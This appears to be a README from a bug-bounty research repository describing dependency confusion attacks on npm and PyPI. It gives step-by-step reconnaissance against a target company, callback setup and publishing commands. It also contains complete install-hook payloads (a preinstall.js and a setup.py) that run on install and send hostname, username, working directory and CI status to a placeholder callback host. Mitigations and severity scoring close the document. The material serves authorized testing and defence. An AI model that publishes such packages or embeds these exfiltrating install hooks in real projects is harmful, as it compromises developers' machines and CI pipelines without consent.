# 📦 Dependency Confusion Attack

> **Technique Class:** Supply Chain Attack  
> **Severity:** Critical (CVSS 9.8)  
> **Researcher Reference:** Alex Birsan (2021) — $130,000+ in bug bounties  
> **Author:** RASTTHACK

---

## Table of Contents

1. [What Is Dependency Confusion?](#1-what-is-dependency-confusion)
2. [How It Works](#2-how-it-works)
3. [Real-World Impact (Birsan 2021)](#3-real-world-impact-birsan-2021)
4. [Attack Phases](#4-attack-phases)
   - [Phase 1: Reconnaissance](#phase-1-reconnaissance)
   - [Phase 2: Validation](#phase-2-validation)
   - [Phase 3: Callback Infrastructure](#phase-3-callback-infrastructure)
   - [Phase 4: Package Creation](#phase-4-package-creation)
   - [Phase 5: Publishing](#phase-5-publishing)
   - [Phase 6: Monitoring](#phase-6-monitoring)
   - [Phase 7: Reporting](#phase-7-reporting)
   - [Phase 8: Cleanup](#phase-8-cleanup)
5. [Tools in This Module](#5-tools-in-this-module)
6. [Mitigations & Defenses](#6-mitigations--defenses)
7. [CVSS Scoring Guide](#7-cvss-scoring-guide)
8. [References](#8-references)

---

## 1. What Is Dependency Confusion?

Dependency confusion (also called a **namespace confusion attack** or **private package substitution attack**) exploits the way package managers resolve package names when both a **private internal registry** and a **public registry** are configured.

When a company uses a private package named `company-auth-utils` but fails to register that name on the public registry (PyPI, npm, RubyGems), an attacker can:

1. Register `company-auth-utils` publicly
2. Set a higher version number than the internal one
3. Wait for the target's build system to pull and execute the attacker's code

```
BEFORE ATTACK                          AFTER ATTACK
─────────────────────────────          ──────────────────────────────────
Internal registry:                     Internal registry:
  company-auth-utils v1.2.0              company-auth-utils v1.2.0

Public registry:                       Public registry (attacker registers):
  [NOTHING]                              company-auth-utils v99.99.1 ← WINS

Package manager resolves:              Package manager resolves:
  → v1.2.0 (correct)                    → v99.99.1 (attacker's payload)
```

---

## 2. How It Works

### Version Precedence

Most package managers prefer the **highest available version number**, regardless of the source registry. This is the core of the attack.

```
npm install company-auth-utils
  ↓
Checks both:  private.registry.company.com → v1.2.0
              registry.npmjs.org           → v99.99.1  ← higher version wins
  ↓
Installs attacker's package
  ↓
Executes preinstall/postinstall scripts → RCE
```

### Affected Package Managers

| Manager | Ecosystem | Install Hook |
|---------|-----------|--------------|
| npm / yarn / pnpm | Node.js | `preinstall`, `postinstall` in `scripts` |
| pip | Python | `cmdclass` in `setup.py` |
| RubyGems | Ruby | `post_install_message` + install hooks |
| NuGet | .NET | Init scripts |
| Composer | PHP | `scripts` block |

---

## 3. Real-World Impact (Birsan 2021)

In February 2021, security researcher **Alex Birsan** documented this technique and responsibly disclosed it to dozens of major companies.

| Company | Impact | Bounty |
|---------|--------|--------|
| Apple | Code execution on internal build systems | Paid |
| Microsoft | Code execution on Azure, npm infrastructure | Paid |
| PayPal | CI/CD pipeline compromise | Paid |
| Shopify | Internal tooling affected | Paid |
| Netflix | Build server impact | Paid |
| **Total** | **35+ companies** | **$130,000+** |

> Birsan used **DNS callback payloads only** — no destructive actions. This is the ethical standard for all dependency confusion research.

---

## 4. Attack Phases

### Phase 1: Reconnaissance

Find internal package names that are not registered publicly.

#### 1A. Search GitHub Repos

```bash
# Search target org's public repos for package.json files
gh search code --owner targetcompany filename:package.json

# Look for references to internal registries
gh search code --owner targetcompany "registry.targetcompany.com"
gh search code --owner targetcompany "npm ERR! 404"

# requirements.txt for Python targets
gh search code --owner targetcompany filename:requirements.txt
```

#### 1B. Scan Public Docker Images

```bash
# Pull and inspect their public images
docker pull targetcompany/someimage:latest
docker history targetcompany/someimage:latest --no-trunc | grep -E "npm install|pip install"

# Inspect the image filesystem
docker create --name temp targetcompany/someimage
docker cp temp:/app/package.json ./
docker rm temp
```

#### 1C. Check CI/CD Logs

Many companies leave their CI logs public on GitHub Actions or CircleCI. Search for:

```bash
# GitHub Actions log leaking package names
gh search code --owner targetcompany ".yml" "npm install"

# Keywords to look for in any CI logs:
# "ENOENT"  "404 Not Found"  "Could not find a version that satisfies"
# "private registry"  "verdaccio"  "artifactory"  "nexus"
```

#### 1D. Extract from Job Postings

Job postings sometimes mention internal tooling:

```
"Experience with our @company/design-system library"
"Familiar with company-auth-sdk"
```

---

### Phase 2: Validation

Confirm the package name is squattable (not registered publicly).

```bash
# npm
npm show suspected-package-name 2>&1 | grep "404"

# PyPI
pip index versions suspected-package-name 2>&1 | grep "WARNING"

# RubyGems
gem search suspected-package-name --exact

# Automated check (see tools/check_squattable.py)
python3 tools/check_squattable.py --names package1 package2 package3
```

---

### Phase 3: Callback Infrastructure

Set up out-of-band detection before touching anything.

#### Option A: interactsh (Free, Open Source — Recommended)

```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start listener — copy the URL it gives you
interactsh-client -v

# Output example:
# [INF] Listing on oast.fun. interactsh server
# [INF] Your URL: abc123xyz.oast.fun
```

#### Option B: Burp Collaborator (Burp Pro)

```
Burp Suite → Burp menu → Burp Collaborator client → Copy to clipboard
```

Keep your callback URL ready. You will embed it in your payload.

---

### Phase 4: Package Creation

> ⚠️ **All payloads here use DNS/HTTP callbacks only. No destructive actions.**

#### npm Payload

```
mkdir rastthack-TARGET-PACKAGENAME
cd rastthack-TARGET-PACKAGENAME
```

**`package.json`:**
```json
{
  "name": "target-internal-package-name",
  "version": "99.99.1",
  "description": "Security research — dependency confusion PoC",
  "scripts": {
    "preinstall": "node preinstall.js"
  },
  "author": "RASTTHACK — Bug Bounty Research",
  "license": "MIT"
}
```

**`preinstall.js`:**
```javascript
const https = require('https');
const os = require('os');
const dns = require('dns');

const CALLBACK = 'YOUR-INTERACTSH-URL.oast.fun';

const info = {
  pkg: 'npm',
  host: os.hostname(),
  platform: os.platform(),
  user: process.env.USER || process.env.USERNAME || 'unknown',
  cwd: process.cwd(),
  ci: !!(process.env.CI || process.env.GITHUB_ACTIONS || process.env.JENKINS_URL),
  ts: Date.now()
};

const sub = `npm-${info.host}-${info.ts}`
  .replace(/[^a-z0-9-]/gi, '-')
  .toLowerCase()
  .slice(0, 40);

// DNS callback
dns.lookup(`${sub}.${CALLBACK}`, () => {});

// HTTP callback
const payload = Buffer.from(JSON.stringify(info)).toString('base64');
https.get(`https://${CALLBACK}/?data=${payload}`, () => {}).on('error', () => {});

console.log('[SECURITY RESEARCH] Dependency confusion PoC — RASTTHACK');
console.log('[SECURITY RESEARCH] Detection-only payload. No harm done.');
console.log('[SECURITY RESEARCH] Please check your bug bounty inbox.');
```

#### PyPI Payload

**`setup.py`:**
```python
from setuptools import setup
from setuptools.command.install import install
import os, socket, platform, base64, json, urllib.request

CALLBACK = "YOUR-INTERACTSH-URL.oast.fun"

class PostInstall(install):
    def run(self):
        install.run(self)
        try:
            info = {
                "pkg": "pypi",
                "host": socket.gethostname(),
                "platform": platform.system(),
                "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
                "cwd": os.getcwd(),
                "ci": bool(
                    os.getenv("CI") or os.getenv("GITHUB_ACTIONS") or
                    os.getenv("JENKINS_URL") or os.getenv("GITLAB_CI")
                )
            }
            payload = base64.b64encode(json.dumps(info).encode()).decode()

            # DNS callback
            sub = f"pip-{info['host']}".replace(" ", "-").lower()[:40]
            try: socket.gethostbyname(f"{sub}.{CALLBACK}")
            except: pass

            # HTTP callback
            url = f"https://{CALLBACK}/?data={payload}"
            try: urllib.request.urlopen(url, timeout=5)
            except: pass

            print("[SECURITY RESEARCH] Dependency confusion PoC — RASTTHACK")
            print("[SECURITY RESEARCH] Detection-only. No harm done.")
        except Exception:
            pass

setup(
    name="target-internal-package-name",
    version="99.99.1",
    description="Security research — bug bounty dependency confusion",
    author="RASTTHACK",
    python_requires=">=3.6",
    cmdclass={"install": PostInstall},
)
```

---

### Phase 5: Publishing

```bash
# npm
npm login
npm publish

# Verify it's live
npm show target-internal-package-name

# PyPI
pip install build twine --break-system-packages
python -m build
twine upload dist/*

# Verify
pip index versions target-internal-package-name
```

---

### Phase 6: Monitoring

```bash
# Watch interactsh terminal for incoming hits
interactsh-client -v

# Example hit output:
# [INF] abc123.oast.fun DNS interaction from 34.102.xx.xx (Google Cloud)
# [INF] abc123.oast.fun HTTP GET /?data=eyJwa2ci...

# Decode the base64 data field:
echo "eyJwa2ci..." | base64 -d | python3 -m json.tool
```

**When you get a hit, immediately record:**

| Data Point | Why It Matters |
|------------|----------------|
| Timestamp | Establishes timeline for report |
| Hostname | Identifies dev machine vs build server |
| `ci: true` | Elevates to Critical if CI/CD is affected |
| IP / Cloud provider | Confirms production infrastructure |

---

### Phase 7: Reporting

See [`reports/report_template.md`](./reports/report_template.md) for the full template.

**Severity Escalation Guide:**

| Execution Context | Severity | Reasoning |
|-------------------|----------|-----------|
| Developer machine only | Medium / High | Limited blast radius |
| Staging CI/CD | High | Pre-production pipeline |
| Production CI/CD | Critical | Direct supply chain compromise |
| Production runtime | Critical | Live RCE |

---

### Phase 8: Cleanup

```bash
# npm — unpublish immediately after report is triaged
npm unpublish target-internal-package-name --force

# PyPI — submit removal request at:
# https://pypi.org/help/#file-name-reuse
# Or email: admin@pypi.org

# Document your cleanup in the report
```

---

## 5. Tools in This Module

| Tool | Purpose |
|------|---------|
| [`tools/check_squattable.py`](./tools/check_squattable.py) | Batch-check multiple package names across npm + PyPI |
| [`tools/monitor_callbacks.sh`](./tools/monitor_callbacks.sh) | Wrapper to start interactsh and log hits to file |
| [`payloads/npm_payload/`](./payloads/npm_payload/) | Ready-to-edit npm package template |
| [`payloads/pypi_payload/`](./payloads/pypi_payload/) | Ready-to-edit PyPI package template |
| [`reports/report_template.md`](./reports/report_template.md) | Complete bug bounty report template |

---

## 6. Mitigations & Defenses

For defenders and red teamers who need to report remediation steps:

| Defense | Implementation |
|---------|----------------|
| **Namespace squatting** | Register all internal package names publicly as empty placeholders |
| **Registry pinning** | `.npmrc`: `registry=https://private.registry.company.com` |
| **Scoped packages** | Use `@company/package-name` — scoped names are harder to squat |
| **Hash pinning** | Lock `package-lock.json` and `requirements.txt` to specific SHA hashes |
| **Artifactory/Nexus rules** | Configure to always prefer internal over public for conflicting names |
| **SCA tooling** | Snyk, Socket.dev, Dependabot — alert on suspicious new packages |
| **SLSA framework** | Supply chain levels for software artifacts |

---

## 7. CVSS Scoring Guide

```
Attack Vector:       Network (N)
Attack Complexity:   Low (L)
Privileges Required: None (N)
User Interaction:    None (N)
Scope:               Changed (C) — affects build infrastructure
Confidentiality:     High (H) — secrets exfiltration possible
Integrity:           High (H) — code injection into build artifacts
Availability:        High (H) — can disrupt build pipelines

Base Score: 9.8 (Critical)
```

Adjust downward if:
- Only developer machines are affected (not CI/CD) → ~7.5 High
- Program has specific limitations in scope

---

## 8. References

- [Alex Birsan — Dependency Confusion (2021)](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [OWASP A06:2021 — Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
- [SLSA Supply Chain Framework](https://slsa.dev/)
- [ProjectDiscovery interactsh](https://github.com/projectdiscovery/interactsh)
- [Confused — Squattable Package Scanner](https://github.com/visma-prodsec/confused)
- [npm Security Best Practices](https://docs.npmjs.com/packages-and-modules/securing-your-code)

---

*Maintained by [RASTTHACK](https://github.com/rastthack) · For educational and authorized testing only.*
